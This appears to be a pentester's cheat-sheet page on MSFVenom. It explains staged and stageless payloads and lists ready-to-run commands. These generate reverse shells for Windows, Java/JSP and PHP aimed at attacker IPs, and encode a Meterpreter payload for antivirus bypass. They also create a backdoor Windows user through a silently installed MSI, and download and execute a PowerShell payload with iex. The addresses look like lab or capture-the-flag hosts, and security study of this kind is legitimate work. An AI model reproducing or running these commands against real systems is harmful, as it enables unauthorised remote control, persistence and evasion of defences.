---
tags:
  - Exploitation
  - RemoteShells
  - Tooling
---
MSFVenom is the payload creating cousin of Metasploit. With it, you can create a wide variety of shellcodes, reverse TCP connectors, and much more. [MSFvenom - Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/msfvenom/)

Reverse connections are less likely to trigger prevention systems like the one initializing the connection is the victim host, which most of the time resides in what is known as a `security trust zone`. However, of course, this trust policy is not blindly followed by the security devices and personnel of a network, so the attacker must tread carefully even with this step.

## Staged vs. Stageless Payloads

`Staged` payloads create a way for us to send over more components of our attack. When run a staged payload using an exploit module in Metasploit, the payload will send a small `stage` that will be executed on the target and then call back to the `attack box` to download the remainder of the payload over the network, then executes the shellcode to establish a reverse shell.

`Stageless` payloads do not have a stage. Using an exploit module in Metasploit, this payload will be sent in its entirety across a network connection without a stage. This could benefit us in environments where we do not have access to much bandwidth and latency can interfere. Staged payloads could lead to unstable shell sessions in these environments, so it would be best to select a stageless payload. In addition to this, stageless payloads can sometimes be better for evasion purposes due to less traffic passing over the network to execute the payload, especially if we deliver it by employing social engineering. This concept is also very well explained by Rapid 7 in this blog post on [stageless Meterpreter payloads](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/).

## Usage

##### List Payloads 

```shell-session
msfvenom -l payloads
```

##### Options 

| Option                            | Description                                            |
| --------------------------------- | ------------------------------------------------------ |
| -p \<PAYLOAD\>                    | Generate a payload from the list in [[#List Payloads]] |
| LHOST=10.10.14.113 LPORT=443 <br> | Addresses to connect back to                           |
| -f elf                            | Format to generate the payload in                      |
| -o \<FILE\>                       | Output file                                            |

# Anti-Virus Bypass 

* `msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.xx.xx LPORT=1339 -e x86/shikata_ga_nai -i 100 -f csharp`
* 
If the program gets closed quickly you can use` msf exploit(multi/handler) > set AutoRunScript post/windows/manage/migrate`  in MSF console
# Windows 

```
sudo msfvenom -p windows/adduser USER=quas4r PASS=quas4r@123 -f msi -o exploit.msi
```

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=445 -f psh -o www/met-445.ps1

iex(new-object net.webclient).downloadstring('http://10.10.14.5/met-445.ps1')
```

```
sudo msfvenom -p windows/adduser USER=quas4r PASS=quas4r@123 -f msi -o exploit.msi
msiexec /quiet /qn /i C:\Users\phoebe\exploit.msi
```

# Example commands:
* `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.118.8 LPORT=443 -f hta-psh -o evil.hta`
* `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.68 LPORT=445 -f exe > shell.exe`
* `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.17 LPORT=443 -f raw > shell.jsp`
* `msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.49.65 lport=443 -f raw`

